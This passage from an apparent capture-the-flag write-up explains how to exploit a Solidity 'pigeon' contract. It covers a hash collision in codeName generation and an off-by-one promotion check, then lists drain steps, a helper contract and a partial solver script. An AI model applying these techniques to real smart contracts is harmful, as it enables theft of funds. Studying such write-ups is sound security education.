</span></span><span class="line"><span class="cl">        <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">isPigeon</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">codeToName</span><span class="p">[</span><span class="nb">code</span><span class="p">][</span><span class="nb">name</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">codeName</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is a bug with the <code>codeName</code> generation. Notice that to generate the <code>codeName</code>, we basically do <code>hash(code+name)</code>. However, this means that we can easily create hash collision to overwrite the existing <code>juniorPigeon</code> mapping. For example, suppose that we want to impersonate junior pigeon <code>(&quot;Numbuh&quot;, &quot;5&quot;)</code> (which is one of the pigeon that was infused with <code>ether</code> during the creation). We can simply set our <code>code</code> to <code>&quot;Numbu&quot;</code> and our <code>name</code> to <code>&quot;h5&quot;</code>. The hash result will be the same as <code>(&quot;Numbuh&quot;, &quot;5&quot;)</code>. By doing this, we can overwrite the stored address of the <code>juniorPigeon</code> easily.</p>
<p>Now, remember that the goal is to drain the balance of <code>pigeon</code> and transfer all of it to us. Notice that there is an interesting function called <code>flyAway</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flyAway</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">rank</span><span class="p">)</span> <span class="k">public</span> <span class="n">oneOfUs</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">bag</span> <span class="o">=</span> <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">juniorPromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">].</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">bag</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">associatePromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">associatePigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">].</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">bag</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">seniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">].</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">bag</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we call <code>flyAway</code>, the address of the pigeon will get <code>treasury[codeName]</code> of ether. Remember that we can easily overwrite the address of any pigeon with our address, so to steal the ether, we can simply:</p>
<ul>
<li>Overwrite the pigeon address with our address via the hash collision in <code>codeName</code> generation.</li>
<li>Call <code>flyAway</code> to steal the ether.</li>
</ul>
<p>Our user current rank is still <code>juniorPigeon</code>, and in order to drain the whole <code>pigeon</code> ether, we need to do <code>promotion</code> as well. Luckily, the <code>promotion</code> allowed us to set a new <code>codeName</code>, and the <code>codeName</code> generation is still prone to hash collision. So, on each promotion, we can simply set the <code>codeName</code> to collide with the created <code>pigeon</code> which has ether.</p>
<p>To get <code>promotion</code>, we need to do <code>task</code>. However, if we do <code>task</code>, if our <code>taskPoints</code> larger than the threshold set for the promotion, we won&rsquo;t be able to <code>flyAway</code>. Luckily, there is another bug here. Compare the checks those are used in the <code>flyAway</code> and <code>promotion</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flyAway</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">rank</span><span class="p">)</span> <span class="k">public</span> <span class="n">oneOfUs</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">bag</span> <span class="o">=</span> <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">treasury</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">rank</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">juniorPromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">promotion</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">codeName</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">desiredRank</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">newCode</span><span class="p">,</span> <span class="kt">string</span> <span class="k">memory</span> <span class="n">newName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span>
</span></span><span class="line"><span class="cl">        <span class="n">oneOfUs</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">desiredRank</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">!=</span> <span class="n">juniorPigeon</span><span class="p">[</span><span class="n">codeName</span><span class="p">])</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">taskPoints</span><span class="p">[</span><span class="n">codeName</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">juniorPromotion</span><span class="p">)</span> <span class="nb">revert</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">...</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that, if the <code>taskPoints</code> are equals to the promotion&rsquo;s threshold, we actually can:</p>
<ul>
<li>Call <code>flyAway</code> and steal the ether.</li>
<li>Call <code>promotion</code>. We can still do <code>promotion</code> because the check in <code>promotion</code> is allowing equals <code>taskPoints</code>.</li>
</ul>
<p>So, the goal is very clear, we need to do tasks until the points are equal to the given threshold, call <code>flyAway</code> (to steal the ether), and then call <code>promotion</code> so that we can start to steal ether from the higher rank pigeon.</p>
<p>To make it easier on controlling the points that we get during calling <code>task</code>, we can simply deploy a dummy contract and then set its balance to crafted value so that the <code>taskPoints</code> can be easily set to be equivalent with the threshold.</p>
<p>My solution full flow is like below:</p>
<ul>
<li>Create a dummy contract, initialize it with 4 ether</li>
<li>Call <code>becomeAPigeon</code> to make the player as a <code>juniorPigeon</code>.
<ul>
<li>Set the <code>code</code> to <code>Numbu</code> and the <code>name</code> to <code>h5</code>, so that we will overwrite the stored address of <code>juniorPigeon[Numbuh5]</code> with our address, and later steal all of its ether (which is 5 ether based on the <code>Setup</code> contract).</li>
</ul>
</li>
<li>Do <code>task</code> twice by setting the <code>person</code> parameter to our dummy contract.
<ul>
<li>Doing twice will make our <code>taskPoints</code> to 8 ether, which is equivalent to the <code>juniorPromotion</code> threshold.</li>
</ul>
</li>
<li>Call <code>flyaway</code>
<ul>
<li>We get 5 ether from this.</li>
</ul>
</li>
<li>Call <code>promotion</code>
<ul>
<li>Set the <code>code</code> to <code>Numbu</code> and the <code>name</code> to <code>h3</code>, so that we will overwrite the stored address of <code>associatePigeon[Numbuh3]</code> with our address, and later steal all of its ether (which is 10 ether based on the <code>Setup</code> contract).</li>
</ul>
</li>
<li>Now, transfer extra 2 ether to our dummy contract, to make the balance become 6 ether.</li>
<li>Do <code>task</code> twice by setting the <code>person</code> parameter to our dummy contract.
<ul>
<li>Doing twice will make our <code>taskPoints</code> to 12 ether, which is equivalent to the <code>associatePromotion</code> threshold.</li>
</ul>
</li>
<li>Call <code>flyaway</code>
<ul>
<li>We get 10 ether from this.</li>
</ul>
</li>
<li>Call <code>promotion</code>
<ul>
<li>Set the <code>code</code> to <code>Numbu</code> and the <code>name</code> to <code>h1</code>, so that we will overwrite the stored address of <code>seniorPigeon[Numbuh1]</code> with our address, and later steal all of its ether (which is 15 ether based on the <code>Setup</code> contract).</li>
</ul>
</li>
<li>Call <code>flyaway</code>
<ul>
<li>We get 15 ether from this.</li>
</ul>
</li>
<li>Take back the ether from our dummy contract back to us, so that we will have balance more than 34 ether.</li>
</ul>
<h3 id="full-script-1">Full Script</h3>
<p><strong>Dummy Contract</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// SPDX-License-Identifier: UNLICENSED
</span></span><span class="line"><span class="cl">pragma solidity &gt;=0.8.17;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">contract TempStorage{
</span></span><span class="line"><span class="cl">    constructor() payable {}
</span></span><span class="line"><span class="cl">    receive() external payable {}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function getBack() external payable {
</span></span><span class="line"><span class="cl">        (bool success,) = msg.sender.call{value: address(this).balance}(&#34;&#34;);
</span></span><span class="line"><span class="cl">        require(success, &#34;Failed to transfer&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Solver</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">web3</span> <span class="kn">import</span> <span class="n">Web3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">solcx</span> <span class="kn">import</span> <span class="n">compile_files</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;win.the.seetf.sg&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">8548</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">launch_instance</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Launch instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid:           &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">uuid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;rpc endpoint:   &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rpc_endpoint</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;private key:    &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;setup contract: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">setup_address</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;uuid          = </span><span class="si">{</span><span class="n">uuid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;rpc_endpoint  = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;private_key   = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;setup_address = </span><span class="se">\&#39;</span><span class="si">{</span><span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">uuid</span><span class="p">,</span> <span class="n">rpc_endpoint</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">setup_address</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">kill_instance</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Kill instance...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Get Flag...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;action? &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;uuid please: &#39;</span><span class="p">,</span> <span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">readrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flag</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Launch instance</span>
</span></span><span class="line"><span class="cl"><span class="n">uuid</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># uuid          = b&#39;e00734cf-96a7-4959-8b3f-6c646a2a5745&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># rpc_endpoint  = &#39;http://win.the.seetf.sg:8547/e00734cf-96a7-4959-8b3f-6c646a2a5745&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># private_key   = &#39;0x98c95134b9c5a731d87e81e4e065ef56630ea6a0d967ee1ba507888d3a53a487&#39;</span>
